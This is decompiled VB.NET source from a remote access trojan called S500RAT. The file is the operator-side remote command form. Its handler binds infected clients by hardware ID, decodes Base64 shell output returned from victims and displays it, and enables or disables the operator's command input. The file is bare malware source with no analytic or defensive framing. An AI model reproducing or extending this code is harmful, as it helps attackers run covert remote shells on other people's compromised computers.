Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000046 RID: 70
	Public Class FrmCMD
		' Token: 0x06001181 RID: 4481 RVA: 0x00097A18 File Offset: 0x00095C18
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formCMD As FormCMD = CType(Application.OpenForms("FrmCMD" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormCMD)
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				If Operators.CompareString(asString, "setClient", False) <> 0 Then
					If Operators.CompareString(asString, "Ready", False) <> 0 Then
						If Operators.CompareString(asString, "WriteCmd", False) <> 0 Then
							If Operators.CompareString(asString, "Event", False) = 0 Then
								Dim flag As Boolean = formCMD IsNot Nothing
								If flag Then
									Try
										formCMD.T2.[ReadOnly] = True
										formCMD.T2.BackColor = Color.DarkRed
									Catch ex As Exception
									End Try
								End If
							End If
						Else
							Dim flag2 As Boolean = formCMD IsNot Nothing
							If flag2 Then
								Try
									Dim t As UIRichTextBox = formCMD.T1
									SyncLock t
										formCMD.T1.SelectionStart = formCMD.T1.TextLength
										Dim t2 As UIRichTextBox = formCMD.T1
										Dim text As String = unpack_msgpack.ForcePathObject("WriteCode").AsString.Replace(vbCrLf, String.Empty)
										t2.AppendText(Functions.DencryptBase64ToString(text) + vbCrLf)
										formCMD.T1.SelectionStart = formCMD.T1.TextLength
										formCMD.T1.ScrollToCaret()
									End SyncLock
								Catch ex2 As Exception
								End Try
							End If
						End If
					Else
						Dim flag3 As Boolean = formCMD IsNot Nothing
						If flag3 Then
							Try
								formCMD.T2.[ReadOnly] = False
								formCMD.T2.BackColor = Color.FromArgb(7, 11, 41)
							Catch ex3 As Exception
							End Try
						End If
					End If
				Else
					Dim flag4 As Boolean = formCMD IsNot Nothing
					If flag4 Then
						Dim flag5 As Boolean = formCMD.Client Is Nothing
						If flag5 Then
							client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString
							formCMD.Client = client
							formCMD.Timer1.Enabled = True
						End If
					End If
				End If
			Catch ex4 As Exception
				ListLogs.AddArray("Cmd " + client.IP + " Error : " + ex4.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
